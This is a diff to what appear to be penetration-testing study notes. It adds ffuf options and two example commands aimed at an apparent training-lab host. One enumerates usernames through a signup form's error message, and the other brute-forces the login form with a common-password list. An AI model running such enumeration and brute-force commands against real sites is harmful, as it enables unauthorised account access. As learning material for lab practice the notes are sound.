@@ -61,6 +61,18 @@ First stage of penetration test. Gather passive knowledge of targets through ope
 	- -w : wordlist
 	- -H add/edits a header, FUZZ keyword in spot 
 	- -u : url
+	- -mr : text on page looking for
+	- -d : data we are sending
+	- -X : request method
+- Example
+```bash
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.230.40/customers/signup -mr "username already exists"
+```
+- W1 and W2 placeholders for wordlists comma separated
+- -fc : check for HTTP status code
+```bash
+ffuf -w users.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.230.40/customers/login -fc 200
+```
 
 - Discover
 	- Passiv or Active
